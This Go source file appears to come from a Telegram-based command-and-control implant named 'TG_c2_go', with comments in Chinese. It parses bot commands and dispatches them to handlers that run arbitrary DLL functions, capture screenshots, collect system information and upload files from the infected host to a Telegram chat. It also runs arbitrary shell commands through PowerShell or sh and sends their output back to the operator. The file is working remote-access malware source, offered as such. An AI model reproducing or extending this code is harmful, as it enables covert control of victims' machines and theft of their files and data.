package commands

import (
	"fmt"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"TG_c2_go/config"
	"TG_c2_go/functions"
	"TG_c2_go/telegram"
)

// CommandProcessor 处理各种命令
type CommandProcessor struct {
	client        *telegram.TelegramClient
	infoCollector *functions.InfoCollector
	screenCap     *functions.ScreenCapture
	dllRunner     *functions.DLLRunner
}

// NewCommandProcessor 创建新的命令处理器
func NewCommandProcessor() *CommandProcessor {
	return &CommandProcessor{
		client:        telegram.NewTelegramClient(),
		infoCollector: functions.NewInfoCollector(),
		screenCap:     functions.NewScreenCapture(),
		dllRunner:     functions.NewDLLRunner(),
	}
}

// MatchCommand 匹配和处理Bot命令
func (cp *CommandProcessor) MatchCommand(cmd string, updateID int64) error {
	// 构建正则表达式模式
	botName := config.BOT_NAME
	fmt.Printf("[调试] 尝试匹配命令: '%s', Bot名称: '%s'\n", cmd, botName)

	patterns := map[string]*regexp.Regexp{
		"disconnect":     regexp.MustCompile(fmt.Sprintf(`^/disconnect(@%s)?$`, botName)),
		"run_dll":        regexp.MustCompile(fmt.Sprintf(`^/run_dll(@%s)?`, botName)),
		"set_sleep_time": regexp.MustCompile(fmt.Sprintf(`^/set_sleep_time(@%s)?\s+\d+$`, botName)),
		"screen_shot":    regexp.MustCompile(fmt.Sprintf(`^/screen_shot(@%s)?$`, botName)),
		"info_collect":   regexp.MustCompile(fmt.Sprintf(`^/info_collect(@%s)?$`, botName)),
		"upload":         regexp.MustCompile(fmt.Sprintf(`^/upload(@%s)?\s*`, botName)),
		"setting_info":   regexp.MustCompile(fmt.Sprintf(`^/setting_info(@%s)?$`, botName)),
	}

	switch {
	case patterns["disconnect"].MatchString(cmd):
		return cp.handleDisconnect()

	case patterns["run_dll"].MatchString(cmd):
		return cp.handleRunDLL(cmd)

	case patterns["set_sleep_time"].MatchString(cmd):
		return cp.handleSetSleepTime(cmd)

	case patterns["screen_shot"].MatchString(cmd):
		return cp.handleScreenShot()

	case patterns["info_collect"].MatchString(cmd):
		fmt.Printf("[调试] 匹配到info_collect命令\n")
		return cp.handleInfoCollect()

	case patterns["upload"].MatchString(cmd):
		return cp.handleUpload(cmd)

	case patterns["setting_info"].MatchString(cmd):
		return cp.handleSettingInfo(updateID)

	default:
		fmt.Printf("[调试] 未匹配到任何Bot命令: '%s'\n", cmd)
		return nil // 不是支持的Bot命令
	}
}

// handleDisconnect 处理断开连接命令
func (cp *CommandProcessor) handleDisconnect() error {
	fmt.Println("触发断开连接")
	cp.client.SendMessage("断开连接")
	// 在Go中我们使用os.Exit(0)来退出程序
	// 但在实际应用中可能需要更优雅的关闭方式
	return fmt.Errorf("disconnect")
}

// handleRunDLL 处理运行DLL命令
func (cp *CommandProcessor) handleRunDLL(cmd string) error {
	fmt.Println("触发run_dll")
	parts := strings.Fields(cmd)
	if len(parts) != 3 {
		err := cp.client.SendMessage("命令格式错误，应遵循/run_dll <dll_name> <function_name>")
		return err
	}

	dllName := parts[1]
	functionName := parts[2]

	return cp.dllRunner.RunDLL(dllName, functionName)
}

// handleSetSleepTime 处理设置睡眠时间命令
func (cp *CommandProcessor) handleSetSleepTime(cmd string) error {
	fmt.Println("触发sleep_time")
	parts := strings.Fields(cmd)
	if len(parts) != 2 {
		return cp.client.SendMessage("命令格式错误，应遵循/set_sleep_time <time>")
	}

	sleepTime, err := strconv.ParseUint(parts[1], 10, 64)
	if err != nil {
		sleepTime = 5
	}

	config.SetSleepTime(sleepTime)
	fmt.Printf("设置睡眠时间: %d秒\\n", sleepTime)

	return cp.client.SendMessage(fmt.Sprintf("设置睡眠时间成功，当前时间为%d秒", sleepTime))
}

// handleScreenShot 处理屏幕截图命令
func (cp *CommandProcessor) handleScreenShot() error {
	return cp.screenCap.TakeScreenshot()
}

// handleInfoCollect 处理信息收集命令
func (cp *CommandProcessor) handleInfoCollect() error {
	fmt.Println("触发信息收集")
	return cp.infoCollector.CollectInfo()
}

// handleUpload 处理文件上传命令
func (cp *CommandProcessor) handleUpload(cmd string) error {
	fmt.Println("触发上传")
	parts := strings.Fields(cmd)
	if len(parts) != 2 {
		return cp.client.SendMessage("命令格式错误，应遵循/upload <file_path>")
	}

	filePath := parts[1]
	fmt.Printf("文件路径: %s\\n", filePath)

	return cp.client.UploadFile(filePath)
}

// handleSettingInfo 处理设置信息命令
func (cp *CommandProcessor) handleSettingInfo(updateID int64) error {
	fmt.Println("触发设置信息")

	// 获取当前工作目录
	pwd := "Unknown"
	if dir, err := exec.Command("pwd").Output(); err == nil {
		pwd = strings.TrimSpace(string(dir))
	}

	message := fmt.Sprintf(
		"bot_name: %s ,\\n当前请求id: %d ,\\n当前目录: %s ,\\n输出目录: %s ,\\nCHAT_ID: %s ,\\nMESSAGE_THREAD_ID: %d ,\\nSLEEP_TIME: %ds ,\\n机器时间: %s",
		config.BOT_NAME,
		updateID,
		pwd,
		config.OUTPUT_DIR,
		config.CHAT_ID,
		config.GetMessageThreadID(),
		config.GetSleepTime(),
		time.Now().Format("2006-01-02 15:04:05"),
	)

	return cp.client.SendMessage(message)
}

// ExecuteSystemCommand 执行系统命令
func (cp *CommandProcessor) ExecuteSystemCommand(command string) error {
	fmt.Printf("执行系统命令: %s\\n", command)

	var cmd *exec.Cmd
	// 根据操作系统选择正确的shell
	switch runtime.GOOS {
	case "windows":
		// Windows上使用PowerShell或CMD
		cmd = exec.Command("powershell", "-Command", command)
	case "darwin", "linux":
		// macOS和Linux上使用sh
		cmd = exec.Command("sh", "-c", command)
	default:
		// 其他系统尝试使用sh
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()

	result := string(output)
	if err != nil {
		result += fmt.Sprintf("\\n执行错误: %v", err)
	}

	// 如果输出太长，分块发送
	maxLen := 4096
	if len(result) <= maxLen {
		return cp.client.SendMessage(result)
	}

	// 分块发送长消息
	for i := 0; i < len(result); i += maxLen {
		end := i + maxLen
		if end > len(result) {
			end = len(result)
		}

		chunk := result[i:end]
		if err := cp.client.SendMessage(chunk); err != nil {
			return err
		}

		// 避免发送过快
		time.Sleep(100 * time.Millisecond)
	}

	return nil
}
